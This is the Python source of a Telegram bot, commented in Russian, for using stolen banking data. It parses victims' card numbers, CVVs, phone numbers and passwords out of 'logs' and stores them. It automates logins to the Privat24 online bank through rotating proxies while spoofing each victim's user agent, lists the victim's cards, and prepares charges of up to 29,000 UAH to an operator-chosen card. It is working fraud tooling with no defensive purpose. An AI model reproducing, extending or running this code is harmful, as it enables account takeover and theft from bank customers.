import os
import re
import sqlite3
import requests
import json
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from flask import Flask
import threading

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_PATH = "/var/data/sessions.db"

# ========== FLASK ==========
app = Flask(__name__)
@app.route('/ping')
def ping(): return "OK", 200
def run_flask(): app.run(host='0.0.0.0', port=10000)
threading.Thread(target=run_flask, daemon=True).start()

# ========== БОТ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

def get_main_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
    return kb

# ========== БАЗА ДАННЫХ ==========
def init_db():
    os.makedirs("/var/data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT, password TEXT,
        card_from TEXT, expiry TEXT, cvv TEXT,
        ip TEXT, user_agent TEXT,
        amount INTEGER,
        card_to TEXT,
        gateway TEXT,
        mode TEXT,
        status TEXT,
        msg_id INTEGER,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )""")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy_type', 'http')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_url', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('gateway', 'ipay')")
    conn.commit()
    conn.close()

def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def create_session(data, msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO sessions
        (phone, password, card_from, expiry, cvv, ip, user_agent, card_to, gateway, mode, status, msg_id, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (data.get('phone'), data.get('password'), data.get('card'), data.get('expiry'), data.get('cvv'),
         data.get('ip'), data.get('user_agent'), get_setting('card_to'), get_setting('gateway'),
         data.get('mode'), 'waiting_action', msg_id, datetime.now().isoformat()))
    session_id = c.lastrowid
    conn.commit()
    conn.close()
    return session_id

def update_session(session_id, field, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"UPDATE sessions SET {field} = ? WHERE id = ?", (value, session_id))
    conn.commit()
    conn.close()

def get_session(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_session_by_msg(msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code')", (msg_id,))
    row = c.fetchone()
    conn.close()
    return row

# ========== ПАРСЕР ЛОГА ==========
def parse_log(text):
    data = {"card": None, "expiry": None, "cvv": None, "phone": None, "password": None, "ip": None, "user_agent": None, "mode": None}
    lines = text.split("\n")
    for line in lines:
        if "Номер:" in line or "💳" in line:
            match = re.search(r"\d{15,16}", line)
            if match: data["card"] = match.group()
        if "Истекает:" in line or "📅" in line:
            match = re.search(r"\d{2}[/-]?\d{2,4}", line)
            if match: data["expiry"] = match.group()
        if "CVV:" in line or "🎳" in line:
            match = re.search(r"\b\d{3}\b", line)
            if match: data["cvv"] = match.group()
        if "Телефон:" in line or "📲" in line:
            match = re.search(r"\+?\d{10,15}", line)
            if match: data["phone"] = match.group().replace("+", "")
        if "Пароль:" in line or "🤫" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["password"] = parts[1].strip()
        if "IP:" in line or "🌍" in line:
            match = re.search(r"\d+\.\d+\.\d+\.\d+", line)
            if match: data["ip"] = match.group()
        if "User-Agent:" in line or "👻" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["user_agent"] = parts[1].strip()
    if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
    
    if data.get("phone") and data.get("password"):
        data["mode"] = "privat24"
    elif data.get("card") and data.get("expiry") and data.get("cvv"):
        data["mode"] = "payment"
    else:
        data["mode"] = "unknown"
    return data

# ========== РОТАЦИЯ ПРОКСИ ==========
def rotate_proxy():
    rotation_url = get_setting('rotation_url')
    if not rotation_url:
        return get_setting('proxy'), get_setting('proxy_type')
    try:
        response = requests.get(rotation_url, timeout=10)
        if response.status_code == 200:
            proxy = response.text.strip()
            set_setting('proxy', proxy)
            return proxy, get_setting('proxy_type')
    except:
        pass
    return get_setting('proxy'), get_setting('proxy_type')

def get_proxy_dict(proxy_str, proxy_type):
    if not proxy_str:
        return None
    if proxy_type == "socks5":
        return {
            "http": f"socks5://{proxy_str}",
            "https": f"socks5://{proxy_str}"
        }
    else:
        return {
            "http": proxy_str,
            "https": proxy_str
        }

# ========== ВХОД В ПРИВАТ24 (С User-Agent ИЗ ЛОГА) ==========
def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
    session = requests.Session()
    if proxy_str:
        proxy_dict = get_proxy_dict(proxy_str, proxy_type)
        if proxy_dict:
            session.proxies.update(proxy_dict)
    
    headers = {
        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    session.headers.update(headers)

    try:
        response = session.get("https://next.privat24.ua/login/", timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})"}
        
        csrf_token = None
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
        if not match:
            match = re.search(r'"csrfToken":"([^"]+)"', response.text)
        if match:
            csrf_token = match.group(1)
        else:
            return {"status": "error", "message": "❌ Не удалось получить CSRF-токен"}
        
    except Exception as e:
        return {"status": "error", "message": f"❌ Ошибка загрузки страницы: {str(e)}"}

    try:
        response = session.post("https://next.privat24.ua/api/auth/step1",
                                data={"phone": phone, "csrf_token": csrf_token},
                                timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": f"❌ Ошибка отправки номера (код {response.status_code})"}
        data = response.json()
        if data.get("status") != "ok":
            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
    except Exception as e:
        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}

    try:
        response = session.post("https://next.privat24.ua/api/auth/step2",
                                data={"password": password, "csrf_token": csrf_token},
                                timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": f"❌ Ошибка отправки пароля (код {response.status_code})"}
        data = response.json()
        if data.get("status") == "error":
            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
        if data.get("status") == "waiting_code":
            return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session}
        if data.get("status") == "ok":
            return {"status": "success", "message": "✅ Вход выполнен", "session": session}
    except Exception as e:
        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}

    return {"status": "error", "message": "❌ Неизвестная ошибка"}

def get_cards(session):
    try:
        response = session.get("https://next.privat24.ua/api/cards", timeout=30)
        if response.status_code == 200:
            return {"status": "success", "cards": response.json()}
        return {"status": "error", "message": f"Код {response.status_code}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str=None, proxy_type="http"):
    return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}

# ========== ОБРАБОТЧИКИ ==========
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏦 Бот активирован. Шли лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
async def main_menu(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 Карта", callback_data="change_card"),
        InlineKeyboardButton("🌐 Шлюз", callback_data="change_gateway"),
        InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
        InlineKeyboardButton("🔁 Тип прокси", callback_data="change_proxy_type"),
        InlineKeyboardButton("🔁 Ссылка ротации", callback_data="change_rotation"),
        InlineKeyboardButton("📋 Статус", callback_data="show_status"),
        InlineKeyboardButton("🗑 Удалить прокси", callback_data="delete_proxy"),
    )
    await msg.reply("🏦 Админ-панель", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "change_gateway")
async def change_gateway(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 iPay", callback_data="set_gateway_ipay"),
        InlineKeyboardButton("💳 Portmone", callback_data="set_gateway_portmone"),
        InlineKeyboardButton("💳 LiqPay", callback_data="set_gateway_liqpay"),
    )
    await callback.message.reply("🌐 Выберите шлюз:", reply_markup=kb)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_gateway_"))
async def set_gateway(callback: types.CallbackQuery):
    gw = callback.data.split("_")[2]
    set_setting('gateway', gw)
    await callback.message.reply(f"✅ Шлюз установлен: {gw.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "change_proxy_type")
async def change_proxy_type(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔹 HTTP", callback_data="set_type_http"),
        InlineKeyboardButton("🔸 SOCKS5", callback_data="set_type_socks5"),
    )
    await callback.message.reply("Выберите тип прокси:", reply_markup=kb)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("set_type_"))
async def set_proxy_type(callback: types.CallbackQuery):
    ptype = callback.data.split("_")[2]
    set_setting('proxy_type', ptype)
    await callback.message.reply(f"✅ Тип прокси установлен: {ptype.upper()}")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "delete_proxy")
async def delete_proxy(callback: types.CallbackQuery):
    set_setting('proxy', '')
    set_setting('rotation_url', '')
    await callback.message.reply("🗑 Прокси и ссылка ротации удалены.")
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("change_"))
async def settings_callback(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    prompts = {
        "card": "Введите номер карты получателя (15-16 цифр):",
        "proxy": "Введите прокси (ip:port или login:pass@ip:port):",
        "rotation": "Введите ссылку для ротации прокси:",
    }
    await callback.message.reply(prompts.get(action, "Ошибка"))
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "show_status")
async def show_status(callback: types.CallbackQuery):
    card = get_setting('card_to') or "не задана"
    proxy = get_setting('proxy') or "не задан"
    ptype = get_setting('proxy_type') or "http"
    rotation = get_setting('rotation_url') or "не задана"
    gateway = get_setting('gateway') or "не выбран"
    await callback.message.reply(
        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n📌 Тип: {ptype.upper()}\n🔁 Ротация: {rotation}"
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
async def handle_amount_callback(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    session_id = int(parts[1])
    amount = int(parts[2])
    await callback.answer(f"💰 {amount} UAH")
    update_session(session_id, 'amount', amount)
    update_session(session_id, 'status', 'processing')
    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
    proxy_str, proxy_type = rotate_proxy()
    if proxy_str:
        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
    session = get_session(session_id)
    if not session:
        await callback.message.reply("❌ Сессия не найдена.")
        return
    card_from, expiry, cvv, card_to, gateway = session[3], session[4], session[5], session[7], session[8]
    result = make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str, proxy_type)
    update_session(session_id, 'status', 'completed' if result['status'] == 'success' else 'failed')
    await callback.message.reply(result['message'])

@dp.callback_query_handler(lambda c: c.data.startswith("login_"))
async def handle_login_callback(callback: types.CallbackQuery):
    session_id = int(callback.data.split("_")[1])
    await callback.answer("🚀 Вход в Приват24...")
    proxy_str, proxy_type = rotate_proxy()
    if proxy_str:
        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
    session = get_session(session_id)
    if not session:
        await callback.message.reply("❌ Сессия не найдена.")
        return
    phone, password, user_agent = session[1], session[2], session[5]
    result = login_privat24(
        phone=phone,
        password=password,
        user_agent=user_agent,
        proxy_str=proxy_str,
        proxy_type=proxy_type
    )
    if result['status'] == 'waiting_code':
        update_session(session_id, 'status', 'waiting_code')
        await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
        return
    if result['status'] == 'success':
        update_session(session_id, 'status', 'completed')
        cards_result = get_cards(result['session'])
        if cards_result['status'] == 'success':
            await callback.message.reply(f"✅ Вход выполнен. Карты: {json.dumps(cards_result['cards'], indent=2)}")
        else:
            await callback.message.reply(f"✅ Вход выполнен, но не удалось получить карты: {cards_result['message']}")
        return
    await callback.message.reply(result['message'])

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
async def handle_reply(msg: types.Message):
    text = msg.reply_to_message.text
    user_input = msg.text.strip()

    if "номер карты получателя" in text:
        if re.match(r"^\d{15,16}$", user_input):
            set_setting('card_to', user_input)
            await msg.reply(f"✅ Карта: {user_input}")
        else:
            await msg.reply("❌ 15 или 16 цифр.")
        return

    if "прокси" in text:
        set_setting('proxy', user_input)
        await msg.reply(f"✅ Прокси сохранён: {user_input}")
        return

    if "ссылку для ротации" in text:
        if user_input.startswith("http"):
            set_setting('rotation_url', user_input)
            await msg.reply("✅ Ссылка ротации сохранена.")
        else:
            await msg.reply("❌ Введи HTTP/HTTPS ссылку.")
        return

    if "код" in text:
        if not user_input.isdigit() or len(user_input) not in [4, 6]:
            await msg.reply("❌ Код должен быть 4 или 6 цифр!")
            return
        session = get_session_by_msg(msg.reply_to_message.message_id)
        if not session:
            await msg.reply("❌ Сессия не найдена.")
            return
        session_id = session[0]
        await msg.reply("✅ Код подтверждён")
        update_session(session_id, 'status', 'completed')
        return

    await msg.reply("❌ Не понял. Используй кнопки.")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
async def handle_log(msg: types.Message):
    data = parse_log(msg.text)
    if data["mode"] == "unknown":
        await msg.reply("❌ Не удалось распознать данные.")
        return
    session_id = create_session(data, msg.message_id)
    if data["mode"] == "payment":
        kb = InlineKeyboardMarkup(row_width=3)
        amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
        for a in amounts:
            kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
        await msg.reply(
            f"✅ Данные для платежа:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
            f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
            f"👻 UA: {data['user_agent'][:30]}...\n\n"
            f"💰 Выберите сумму:",
            reply_markup=kb
        )
    elif data["mode"] == "privat24":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton("🚀 Войти в Приват24", callback_data=f"login_{session_id}"))
        await msg.reply(
            f"✅ Данные для входа:\n📱 Телефон: {data['phone']}\n"
            f"🤫 Пароль: {data['password'][:3]}***\n🌍 IP: {data['ip']}\n"
            f"👻 UA: {data['user_agent'][:30]}...\n\n"
            f"Нажмите кнопку для входа:",
            reply_markup=kb
        )

if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)
